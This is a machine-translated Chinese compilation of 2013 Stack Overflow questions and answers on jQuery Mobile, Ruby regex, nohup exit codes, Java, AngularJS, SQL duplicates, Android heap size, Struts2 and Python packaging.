我知道以前有人问过这类问题，我已经查过它们，但仍然无法完全理解它。这是我的问题：我希望我网站的索引页面在桌面上的桌面布局和移动设备上的移动 jquery 中查看。到目前为止，我只为台式机设置了我的网站及其 css 文件，但是当我尝试对移动设备使用媒体查询并为此创建一个新的 css 时，我只是看不到如何将新 css 与移动 jquery 关联。在我看来，好像我需要为此创建一个新的源索引文件。

感谢您的任何澄清。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T09:46:30.937

这不能通过媒体查询来完成，至少不是你的问题。

## 第一步

您只需要一个 html 文件，但需要 2 组 javascript 和 css 文件。一组将涵盖桌面站点，另一组将涵盖 jQuery 移动 js 和 css。

## 第二步

下一步是确定浏览器是桌面浏览器还是移动浏览器。可以通过以下几种方式完成：

### 脚本 1：

```
window.mobilecheck = function() {
var check = false;
(function(a){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4)))check = true})(navigator.userAgent||navigator.vendor||window.opera);
return check; } 
```

用法：

```
if(mobilecheck()) {
    alert('mobile'); 
} else {
    alert('desktop');
} 
```

这是一个工作示例：http: [//jsfiddle.net/Gajotres/qqnZ2/](http://jsfiddle.net/Gajotres/qqnZ2/)

### 脚本 2：

其他解决方案更倾向于使用用户代理。[查看DetectMobileBrowsers.com](http://detectmobilebrowsers.com/)上的脚本

无论您选择哪种解决方案，您都需要使用它进行简单的 if 检查，是桌面还是移动。

# 第三步：

此时我们需要某种资源加载器。我们将需要初始化我们的 js/css 集之一。

同样，这可以通过几种方式完成：

### 解决方案1：

看看[yepnope](http://yepnopejs.com/)，它是一个简单的条件资源加载脚本。它也是 Modernizer 框架的一部分。它可以像这样使用（假设您从第二步中选择了脚本 1）：

```
yepnope({
    test : mobilecheck(),
    yep  : ['jquery.mobile-1.2.0.min.js', jquery.mobile-1.2.0.min.css'],
    nope : ['index.js', 'index.css']
}); 
```

或者你可以使用[requirejs](http://requirejs.org/)。像 yepnope 一样好，但我发现它在大型 jQuery Mobile 文件的情况下缺乏。

# javascript - JqueryMobile 1.3 图标没有出现？

> ID：15650294
> 
> 赞同：0
> 
> 时间：2013-03-27T01:08:38.047
> 
> 标签：javascript, android, jquery-mobile, web-ide, codio

我正在 Codio 在线 IDE 上为 android 创建一个移动应用程序，并且我正在使用 jquery mobile。我下载了[最新版本： 1.3.0](http://jquerymobile.com/download/)的 .js 和 .css，但是[当我运行它时](https://d.codio.com/hugolpz/Cat-in-migration/App/index.html)，除了 JQM 图标之外似乎一切正常。**没有出现任何 JQM 图标**，而黑圈应包含各种白色图标。

**如何让 JQM 图标出现？** ![看到黑眼圈，应该有白色图标！](../Images/e6a2b1ecf275772c1ed1e748ca1ce120.png)

* * *

**编辑：答案：**搜索、下载并将[Zip 文件部署到正确的位置：jquery.mobile-1.3.0.zip](http://code.jquery.com/mobile/1.3.0/jquery.mobile-1.3.0.zip)（JavaScript、CSS 和图像）。可在[http://jquerymobile.com/download/获得](http://jquerymobile.com/download/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T01:59:14.767

您缺少图标文件。在您的情况下，它们在 CSS 中被引用，这是缺少的[https://d.codio.com/hugolpz/Cat-in-migration/App/css/images/icons-18-white.png](https://d.codio.com/hugolpz/Cat-in-migration/App/css/images/icons-18-white.png)

# ruby - Ruby正则表达式从字符串中删除所有连续的字母

> ID：15650302
> 
> 赞同：3
> 
> 时间：2013-03-27T01:09:51.437
> 
> 标签：ruby, regex

这是问题（来自 Codeforces）

Polycarp 经常思考生命的意义。他经常这样做，即使在编辑器中打字也是如此。每次他开始沉思时，他再也无法完全集中注意力，反复按下只需要按一次的键。例如，他可以输入“hhoow aaaare yyououu”来代替短语“你好吗”。

Polycarp 决定自动化纠正此类错误的过程。他决定为文本编辑器编写一个插件，该插件将删除成对的相同连续字母（如果文本中有的话）。当然，这并不是波利卡普所需要的，但他必须从一些事情开始！

帮助 Polycarp 编写主插件模块。您的程序应该从字符串中删除所有连续的相同字母对。如果删除后出现新的对，程序也应该删除它们。从技术上讲，它的工作应该等同于以下内容：当字符串包含一对连续的相同字母时，应该删除这对。请注意，可以按任何顺序删除连续的相同字母，因为任何顺序都会导致相同的结果。

这是我的解决方案。由于某种原因，它无法通过一个非常大的测试用例。我的似乎摆脱了比预期更多的字母。这个正则表达式不正确吗？

```
str = gets.chomp

while str =~ /(.)\1/
  str.gsub!(/(.)\1+/,'')
end

puts str 
```

编辑——这个解决方案不起作用，因为它去掉了所有连续的字符组。它应该只删除重复项。如果我这样做，我认为这是正确的，它会在非常大的字符串上超时：

```
str = gets.chomp

while str =~ /(.)\1/
  str.gsub!(/(.)\1/,'')
end

puts str 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-27T02:23:14.413

为什么它必须是正则表达式？

```
'foobar'.squeeze
=> "fobar"

"hhoow aaaare yyoouu".squeeze
=> "how are you" 
```

[`squeeze`](http://www.ruby-doc.org/core-1.9.3/String.html#method-i-squeeze)是压缩所有字符或特定字符的有用工具。[以下是文档](http://www.ruby-doc.org/core-1.9.3/String.html#method-i-squeeze)中的一些示例：

```
“黄月”.squeeze #=>“黄月”
" 现在是".squeeze(" ") #=> " 现在是"
"推杆投球".squeeze("mz") #=> "推杆投球"

```

如果“aab”变成“b”，那么您没有遵循问题中给出的示例，即“hhow”变成了“how”。根据您的说法，它将是“w”，而“yyouuu”将是“”。我认为您对它的阅读过多，并且没有根据他们的示例输入和示例输出来理解问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T01:42:03.303

哈，比我第一次阅读时想象的要难。关于什么

```
s = "hhoow aaaareer yyoouu"
while s.gsub!(/(.)\1+/, '')
end
puts s 
```

`s == 'w'`如果我正确理解了这个问题，那就离开了。

# unix - 如何从 nohup 获取正确的退出代码

> ID：15650307
> 
> 赞同：6
> 
> 时间：2013-03-27T01:10:27.327
> 
> 标签：unix, nohup

从其中的 nohup 文档中`info coreutils 'nohup invocation'`指出：

```
Exit status:

 125 if `nohup' itself fails, and `POSIXLY_CORRECT' is not set
 126 if COMMAND is found but cannot be invoked
 127 if COMMAND cannot be found
 the exit status of COMMAND otherwise 
```

但是，我从 nohup 获得的唯一退出代码是 1 和 0。我有一个在脚本中失败的 nohup 命令，我需要适当的异常......并且根据这个文档，我会假设nohup 退出代码*应该*是 126。相反，它是 0。

我正在运行的命令是：`nohup perl myscript.pl &`

这是因为 perl 成功退出了吗？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-03-27T01:31:25.587

如果您的 shell 脚本使用以下命令运行该进程：

```
nohup perl myscript.pl & 
```

您或多或少放弃了从`nohup`. 如果 shell 分叉，则命令作为一个整体成功为 0，如果 shell 分叉失败，则为 1。在`bash`中，您可以等待后台进程终止并通过以下方式收集其状态`wait`：

```
nohup perl myscript.pl &
oldpid=$!
...do something else or this whole rigmarole is pointless...
wait $oldpid
echo $? 
```

回`$?`显的通常是指定 PID 的退出状态（除非指定的 PID 已经死亡并被等待）。

如果您同步运行该进程，您可以检测到不同的退出状态：

```
(
nohup perl myscript.pl
echo "PID $! exited with status $?" >&2
) & 
```

现在您应该能够从中发现不同的退出状态`nohup`（例如尝试不同的拼写错误：`nohup pearl myscript.pl`等）。

注意子shell作为一个整体是在后台运行的，但是在`nohup`子shell中是同步运行的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-01-11T17:21:08.053

据我了解，问题是如何在 nohup 中运行命令状态。根据我的经验，即使它立即失败，您也很少有机会获得 COMMAND 退出状态。大多数时候你只是得到'nohup COMMAND &'退出状态，除非你像乔纳森提到的那样等待或同步。要在 nohup 之后立即检查命令状态，我使用：

```

  pid=`ps -eo pid,cmd | awk '/COMMAND/ {print $1}'`
  如果 [ -z $pid ]; 然后
     echo "命令失败"
  别的
     echo "命令在 nohup 中运行"
  菲

```

# java - 使用 while 循环将许多对象添加到 arraylist

> ID：15650311
> 
> 赞同：-3
> 
> 时间：2013-03-27T01:10:48.867
> 
> 标签：java, bluej

使用 BlueJ 参加 Java 入门课程。

有两个对象，一个名为**account**的具有相关详细信息的对象和一个名为**bankAccounts**的包含帐户的 ArrayList。

我的任务是使用 while 循环将多个**帐户**添加到**bankAccounts 。**将对象添加到数组列表很容易，但是 BlueJ 会提示您选择帐户。

我不知道如何自动化这个过程，尝试一些类似的东西：

```
public void addMultipleAccounts()
   {
       reader = new InputReader();

       System.out.println("How many accounts would you like to add?");
       int accountsToAdd = Integer.parseInt(reader.getInput());

       while (accountsToAdd>0) {
           System.out.println("Which account would you like to add?");
           String accountToAdd = reader.getInput();
           bankAccounts.add(accountToAdd);
           accountsToAdd--;
       }
   } 
```

这显然行不通。InputReader() 是 prof 提供的类，它使用 Scanner 来收集字符串。

我确定有一种简单的方法可以做到这一点，但我找不到它......我不知道如何提示用户输入对象，BlueJ 总是自动完成。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:44:32.360

```
import java.util.ArrayList;
import java.util.Scanner;

public class Something {

    /**
     * @param args
     */
    public static void main(String[] args) {
        ArrayList<aClass> list = new ArrayList<aClass>();
        String first, second;
        Scanner scanner = new Scanner(System.in);
        int repeat;
        System.out.println("How many items would you like to enter?");
        repeat = scanner.nextInt();

        for (int i = 0; i < repeat; i++) {
            System.out.println("Enter your first parameter");
            first = scanner.next();
            System.out.println("Enter your second parameter");
            second = scanner.next();
            aClass temp = new aClass(first,second); //This will be put into the array
            list.add(temp);
        }

    }

}

class aClass{

    private String something, somethingelse;

    public aClass(String str1, String str2){
        something = str1;
        somethingelse = str2;
    }

} 
```

在这种情况下，您的 'aClass 是您的帐户类别，列表是您的 BackAccounts 数组列表。显然，您需要更改参数以匹配您的帐户类，但这就是您实现它的方式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T01:40:20.567

不知道你想实现什么。也许你应该想一个更好的方法来做这个控制。我试图为我认为你想要的东西构建代码。

```
public void addMultipleAccounts() {
    Scanner s = new Scanner(System.in);
    System.out.println("How many accounts would you like to add?");
    int accountsToAdd = s.nextInt();

    while (accountsToAdd > 0) {
        System.out.println("Which account would you like to add?");
        String accountToAdd = s.nextLine();
        bankAccounts.add(accountToAdd);
        accountsToAdd--;
    }
} 
```

# jquery - 表格中的jQuery总和文本输入

> ID：15650313
> 
> 赞同：1
> 
> 时间：2013-03-27T01:10:55.157
> 
> 标签：jquery, html-table

在我的代码中，当按下按钮添加时，它会在表中创建一行。

我需要在每一行中，当您留下数量或价格输入时，总和会在小计中分配值。

HTML

```
<table width="100%" border="0"  >
<tr>
    <td>Item</td>
    <td>Quantity</td>
    <td>U$ Price</td>
<td>Subtotal</td>
    <td>Add</td>
    <td>Remove</td>
</tr>
<tr class="tr_clone">
    <td>
        <select style="width:200px" name="itens[]">
        <option value="0"></option>
        <option value="1">Item A</option>
        <option value="2">Item B</option>
        <option value="3">Item C</option>
    </td>                                            
    <td><input type="text" size="5" maxlength="5" autofocus name="qtd[]" class="text ui-widget-content ui-corner-all"></td>
    <td><input type="text" size="10" maxlength="10" name="price[]" id="price" class="text ui-widget-content ui-corner-all"></td>
    <td><input type="text" size="10" maxlength="10" name="subtotal[]" class="text ui-widget-content ui-corner-all"></td>
    <td><input type="button" name="add" value="Add" class="tr_clone_add"></td>
    <td><input type="button" name="remove" value="Remove" class="tr_clone_remove"></td>
</tr>
</table> 
```

jQuery

```
var $to_clone = $('.tr_clone').first().clone();

$("table").on('click', 'input.tr_clone_add', function () {
    var $tr    = $(this).closest('.tr_clone');
    var $clone = $to_clone.clone();
    $clone.find(':text').val('');
    $tr.after($clone);
});

$("table").on('click', 'input.tr_clone_remove', function () {
    var $tr    = $(this).closest('.tr_clone');
    $tr.remove();
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T02:50:05.890

尝试这个。应该是您正在寻找的（[小提琴](http://jsfiddle.net/C6Su2/)）[http://jsfiddle.net/C6Su2/]：

HTML：

```
<table width="100%" border="0"  >
<tr>
    <td>Item</td>
    <td>Quantity</td>
    <td>U$ Price</td>
<td>Subtotal</td>
    <td>Add</td>
    <td>Remove</td>
</tr>
<tr class="tr_clone">
    <td>
        <select style="width:200px" name="itens[]">
        <option value="0"></option>
        <option value="1">Item A</option>
        <option value="2">Item B</option>
        <option value="3">Item C</option>
    </td>                                            
    <td><input type="text" size="5" maxlength="5" name="qtd" class="quantity text ui-widget-content ui-corner-all"></td>
    <td><input type="text" size="10" maxlength="10" name="price" class="price text ui-widget-content ui-corner-all"></td>
    <td><input type="text" size="10" maxlength="10" name="subtotal" class="subtotal text ui-widget-content ui-corner-all"></td>
    <td><input type="button" name="add" value="Add" class="tr_clone_add"></td>
    <td><input type="button" name="remove" value="Remove" class="tr_clone_remove"></td>
</tr>
</table> 
```

jQuery 1.3+ ( [jsfiddle](http://jsfiddle.net/C6Su2/) ):

```
 var $to_clone = $('.tr_clone').first().clone();

$("table").on('click', 'input.tr_clone_add', function () {
    var $tr    = $(this).closest('.tr_clone');
    var $clone = $to_clone.clone();
    $clone.find(':text').val('');
    $tr.after($clone);
});

$("table").on('click', 'input.tr_clone_remove', function () {
    var $tr    = $(this).closest('.tr_clone');
    $tr.remove();
});
$(".quantity, .price").live("keyup", function(){
    var prtCont = $(this).parent().parent();
    var prce = parseInt(prtCont.find('.price').val()) - 0;
    var qnty = parseInt(prtCont.find('.quantity').val()) - 0;
    if(!isNaN(prce) && !isNaN(qnty)){
        prtCont.find('.subtotal').val(prce * (qnty));
    }else{
        prtCont.find('.subtotal').val("");
    }
}); 
```

或 jQuery 1.9+ ( [jsfiddle](http://jsfiddle.net/rKjbg/) )

```
var $to_clone = $('.tr_clone').first().clone();

$("table").on('click', 'input.tr_clone_add', function () {
    var $tr    = $(this).closest('.tr_clone');
    var $clone = $to_clone.clone();
    $clone.find(':text').val('');
    $tr.after($clone);
});

$("table").on('click', 'input.tr_clone_remove', function () {
    var $tr    = $(this).closest('.tr_clone');
    $tr.remove();
});

$(document).on("keyup", ".quantity, .price", function(){
    var prtCont = $(this).parent().parent();
    var prce = parseInt(prtCont.find('.price').val()) - 0;
    var qnty = parseInt(prtCont.find('.quantity').val()) - 0;
    if(!isNaN(prce) && !isNaN(qnty)){
        prtCont.find('.subtotal').val(prce * (qnty));
    }else{
        prtCont.find('.subtotal').val("");
    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T03:14:52.560

如果您可以对 html 进行以下更改，请尝试以下代码

1.  将类添加`qty`到输入元素`qtd`

2.  将类添加`price`到输入元素`price`

3.  将类添加`subtotal`到输入元素`subtotal`

代码

```
$('table').on('change', '.qty, .price', function(){
    var tr = $(this).closest('tr');
    var prce = parseInt($('.price', tr).val(), 10);
    var qnty = parseInt($('.qty', tr).val(), 10);
    if(!isNaN(prce) && !isNaN(qnty)){
        $('.subtotal', tr).val(prce * (qnty));
    }else{
        $('.subtotal',tr).val("");
    }
}) 
```

演示：[小提琴](http://jsfiddle.net/arunpjohny/bjU99/)

# javascript - Angularjs：使用ng-option时如何在选择中包含空选项

> ID：15650315
> 
> 赞同：23
> 
> 时间：2013-03-27T01:11:08.660
> 
> 标签：javascript, select, angularjs, option, pug

当我使用 ng-option 提供不包括空选项的预定义选项列表时，如何在开始时添加空选项？

玉的例子

```
select(ng-model="property.Value", ng-options="item.Value as item.Name for item in property.Choices") 
```

* * *

## 回答 #1

> 赞同：52
> 
> 时间：2013-03-27T01:11:08.660

只需在选择中添加一个具有空值的选项。

```
select(ng-model="property.Value", ng-options="item.Value as item.Name for item in property.Choices")
  option(value="") 
```

这是一个例子 - [http://jsfiddle.net/sseletskyy/uky9m/1/](http://jsfiddle.net/sseletskyy/uky9m/1/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-04-29T17:29:45.827

只需以角度修改 property.choices 数组。

> $scope.property.Choices.splice(0, 0, {"id":"0","Name":"Richard"});

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-08-21T10:39:11.387

这只是通过修改对象对我有用

angular.extend({'请选择' : ''},objectName)

# sql - 如何在 SQL Server 2008 中显示与重复电子邮件关联的所有列

> ID：15650316
> 
> 赞同：0
> 
> 时间：2013-03-27T01:11:08.520
> 
> 标签：sql, sql-server-2008, filter, duplicates

我已经进行了一些研究，寻找一种过滤重复电子邮件的方法，以便所有列都显示与这些重复电子邮件相关的数据，但找不到帮助我解决此问题的答案。

我目前使用以下代码提取数据：

```
SELECT
    Email, COUNT(Email) AS dup_count

FROM
    [cem_farmers_masterinvitelist].[dbo].InviteList

GROUP BY
    Email

HAVING
    (COUNT(Email) > 1)

Order by Email 
```

然后它给了我*xxxxxx*的行数。然后，我希望能够提取与这些重复电子邮件相关联的任何数据（列） - 并且只是重复。

```
SELECT * FROM [marks_party_MasterInvite] .[dbo].[InviteList]
WHERE
    Email in(Select Email FROM [marks_party_MasterInvite].[dbo].[InviteList] GROUP BY Email HAVING COUNT(Email)>1) 
```

我知道我做错了什么，因为行数不匹配。

所以任何帮助将不胜感激！

多谢你们，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:13:54.733

您想使用窗口函数。下面将计数添加到每一行。然后您可以使用`where`过滤器来获取所有列：

```
SELECT il.*
FROM (select il.*, count(*) over (partition by email) as cnt
      from [cem_farmers_masterinvitelist].[dbo].InviteList
     ) il
where cnt > 1
Order by Email 
```

计数不匹配，因为当您获取每一行时，您将获得重复。在第一个查询中，您会收到不同的电子邮件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T01:37:09.517

行数会有所不同，如果您想获得所有涉及的重复记录的计数，您可以使用***WITH rollup ***，女巫会为您计算总数......这个数字应该与第二个查询的行数匹配......

```
SELECT
    Email, COUNT(Email) AS dup_count
FROM
    [cem_farmers_masterinvitelist].[dbo].InviteList
GROUP BY
    Email WITH ROLEUP
HAVING
    (COUNT(Email) > 1)
Order by Email 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T01:15:09.757

加入源表，了解您刚刚生成的关于源的知识：

```
SELECT *
FROM [cem_farmers_masterinvitelist].[dbo].InviteList src

INNER JOIN
(
    SELECT
        Email, COUNT(Email) AS dup_count

    FROM
        [cem_farmers_masterinvitelist].[dbo].InviteList

    GROUP BY
        Email
) qDupes
ON qDupes.email = src.email AND qDupes.dup_count > 1 
```

# c++ - c++ 使用文本文件制作图形

> ID：15650318
> 
> 赞同：-1
> 
> 时间：2013-03-27T01:11:12.313
> 
> 标签：c++, graphics, file-io

所以我想使用带有婴儿名字的大文本文件，以及自 1880 年以来每年使用的名字的频率。我有一个包含名字和频率的每年的文本文件。我需要阅读文本文件并让用户输入他们想要查看频率的名称和年份（这不是我遇到的问题，我可以这样做）。但是，当用户输入姓名和年份时，我希望显示一个折线图，将姓名的频率显示为 y 轴，将年份显示为 x 轴。我正在使用 myro，它允许使用图形，但我应该从哪里开始呢？我对如何做到这一点非常迷茫。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:21:48.847

当我在做与之前类似的事情（但在 ASCII 中）时，我很快意识到有两个选择：A）图表看起来不太好，实际上只适合 SCREEN_WIDTH 年，B）图表将只显示最有趣的年 C) 图表不适合在一个屏幕上。D）你会以某种方式总结不适合一个屏幕的值。

我个人选择选项C），可以解决如下：每一列是一年（或一年范围）。将该列的行设置为与频率值相同的高度，等于“COLORED”。

行数也有同样的问题，因为我们只能在那里放置 SCREEN_HEIGHT 元素。然而，只要显示了线条的形状，对我来说这是可以接受的，所以牺牲精度是值得的。

# android - Android 没有分配足够的堆

> ID：15650319
> 
> 赞同：0
> 
> 时间：2013-03-27T01:11:15.320
> 
> 标签：android, performance, android-emulator, garbage-collection

我有一个与 arduino 通信的应用程序，它运行一个 netty 实例来控制 arduino。问题是我没有用完内存，但是根据 adb logcat，总堆大小与使用的堆大小相比太低了我总是在 %10 左右空闲，所以对 netty 服务器的任何请求都会触发 gc，此时我得到了一堆的，

```
D/dalvikvm( 2862): WAIT_FOR_CONCURRENT_GC blocked 189ms 
```

即使是不做任何事情的简单请求（至少对我来说）也会在 gc 暂停时损失至少一秒钟。我有

```
android:largeHeap="true" 
```

在我的清单中设置，模拟器设备的 VM 堆为 512 mb，但它没有分配接近该数字的任何地方（它分配了大约 10MB）。我没有内存泄漏，因为 10% 的空闲是稳定的，它会 +/- 2-3%。即使在具有 2 gigs ram 的手机上（所有其他应用程序都关闭）我总是在运行时使用少于 2 3 MB 的空闲堆是否有解决方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:27:26.470

设备 RAM 的大小并不重要，因为拥有 2 GB RAM 并不意味着您将获得 2GB 堆。

Google 在其建议中指定的最小堆大小为 16MB。你不会得到比这更小的堆。

`largeHeap`仅适用于 Android 3.0 及更高版本，并且不保证更大的堆大小。

要获得更大的堆，您无能为力，但您可以使用 NDK 重写您的应用程序，其中堆大小无关紧要，因为您在 dalvik VM 之外运行，因此可以使用（几乎）所有如果需要，设备的 RAM。

但是，以 10% 的可用堆空间运行也不错。

# iphone - Iphone 联系人列表。按字母顺序对 TableView 视图进行排序

> ID：15650320
> 
> 赞同：0
> 
> 时间：2013-03-27T01:11:18.197
> 
> 标签：iphone, objective-c, sorting, custom-object, contact-list

## 我正在制作一个具有一系列联系人（对象）的 IPHONE 电话簿应用程序。我正在尝试对这个数组进行排序，以便它按字母顺序显示 lastName

但似乎没有任何效果。我不确定将代码放在“MasterViewController”中的哪个位置。这是我的代码的一部分

我的对象如下所示。

```
@interface PhoneBookEntry : Person  
@property NSString *firstName;
@property NSString *lastName;
@property NSString *address;
@property NSString *phoneNumber; 
```

## @结尾

```
@interface MasterViewController : UITableViewController
@property NSMutableArray *elements;
@end 
```

* * *

```
@implementation MasterViewController

- (id)initWithStyle:(UITableViewStyle)style
{
self = [super initWithStyle:style];
if (self) {
}
return self;
}

- (void)viewDidLoad
{
[super viewDidLoad];
self.elements = [[NSMutableArray alloc] init];
} 
```

假设数组中已经有元素。我需要按字母顺序对“self.elements.lastName”数组进行排序，请帮助！！！！！！！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:19:42.407

```
[self.elements sortUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"lastName" ascending:YES]]]; 
```

# android - 如何为旋转动画创建暂停

> ID：15650322
> 
> 赞同：1
> 
> 时间：2013-03-27T01:11:35.900
> 
> 标签：android, animation, android-animation, android-spinner

我需要知道如何暂停我的旋转动画：

```
public void onClick(View v)
{
   ImageView animationTarget = (ImageView) this.findViewById(R.id.ImgWheel);

   switch (v.getId())
   {
      case R.id.playButton:

      playBtn.setVisibility(Button.INVISIBLE);
      pauseBtn.setVisibility(Button.VISIBLE);
      Animation animation = AnimationUtils.loadAnimation(this, R.anim.rotate_around_center_point);
      animationTarget.startAnimation(animation);
      break;

      case R.id.pauseButton:

      pauseBtn.setVisibility(Button.INVISIBLE);
      playBtn.setVisibility(Button.VISIBLE);

      //here is where i may put the pause button codes//

      break;
   }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:46:05.057

如果有帮助，请使用`animationTarget.clearAnimation()`尝试

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-10-07T09:28:39.540

```
public void pauseAnimation(View view) {
anim.pause();
//you need to define anim 
```

# java - Struts2 Iterator OGNL 索引不起作用

> ID：15650325
> 
> 赞同：-2
> 
> 时间：2013-03-27T01:11:57.960
> 
> 标签：java, struts2, iterator, jstl, ognl

我有这个迭代器。

```
<s:iterator value = "myQuestions"  status="key">

<s:property value="%{#key.index}" />
<h1><s:property value = "myQuestions[%{#key.index}].question"/></h1>

</s:iterator> 
```

当迭代器对此进行迭代时

```
<s:property value="%{#key.index}" /> 
```

它显示正确的索引。但是当我添加`%{#key.index}` 这个

```
 <h1><s:property value = "myQuestions[%{#key.index}].question"/></h1> 
```

它不显示处于该特定索引的元素。

因此，假设当前索引为 0。

当我这样做时，`<s:property value = "myQuestions[%{#key.index}].question"/>`它不会显示任何内容。但是当我硬编码它时。

```
<s:property value = "myQuestions[0].question"/> it displays the proper item. what am I missing? 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:38:08.763

你打破了评估。它应该更接近：

```
%{myQuestions[#key.index].question} 
```

但是，这是非常多余的，因为您正在迭代，并且集合中的每个对象都将被推入堆栈，因此您需要引用的只是`question`.

`var`如果需要命名每个对象，也可以使用该属性。

考虑查看迭代器标签文档。

# javascript - jQuery：带有定时器的动态元素淡出

> ID：15650328
> 
> 赞同：0
> 
> 时间：2013-03-27T01:12:03.983
> 
> 标签：javascript, jquery, timer

我的网站上有一个基本的消息系统，它将消息排队/附加到浮动在页面顶部的 div 中。每条消息应该在 X 秒后淡出，但是如果你将鼠标悬停在该消息上，它会暂停它的淡出时间，然后在 mouseleave 上它应该恢复。

所以我试图附加一个 div 并附加一个计时器来淡出，但是在 mouseneter 上它会暂停淡出，而在 mouseleave 上它会恢复它。还有一个关闭按钮会立即使其消失。

我已经尝试过`delay()`，但没有办法控制它，我似乎无法用`setTimeout()`它来做这件事，因为我不知道如何将计时器附加到创建的那个 div 上。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:15:09.020

您需要将计时器 id 添加到全局范围内的对象中，例如`window.timers`，并且在鼠标悬停时，您遍历所有活动的计时器，`clearTimeout()`在它们上并保存一个`timeRemaining`值 - 这与 DOM 就绪时间戳和鼠标悬停事件的时间戳不同。`timeRemaining`在 mouseout 上，您再次使用该值而不是初始时间值设置所有计时器。

# python - 如何在我的项目分发中包含包子文件夹？

> ID：15650331
> 
> 赞同：6
> 
> 时间：2013-03-27T01:12:17.323
> 
> 标签：python, django, setuptools, pypi, distribute

我有一个具有这种结构的项目：

```
SomeProject/
    bin/
    CHANGES.txt
    docs/
    LICENSE.txt
    MANIFEST.in
    README.txt
    setup.py
    someproject/
        __init__.py
        location.py
        utils.py
        static/
            javascript/
                somescript.js 
```

和一个“setup.py”如下：

```
#!/usr/bin/env python

import someproject
from os.path import exists
try:
    from setuptools import setup, find_packages
except ImportError:
    from distutils.core import setup, find_packages

setup(
    name='django-some-project',
    version=someproject.__version__,
    maintainer='Some maintainer',
    maintainer_email='some@manteiner.com',
    packages=find_packages(),
    include_package_data=True,
    scripts=[],
    url='https://github.com/xxx/some-project',
    license='LICENSE',
    description='Some project description.',
    long_description=open('README.markdown').read() if exists("README.markdown") else "",
    install_requires=[
        "Django >= 1.4.0"
    ],
) 
```

然后，当我使用命令上传它时：

```
python setup.py sdist upload 
```

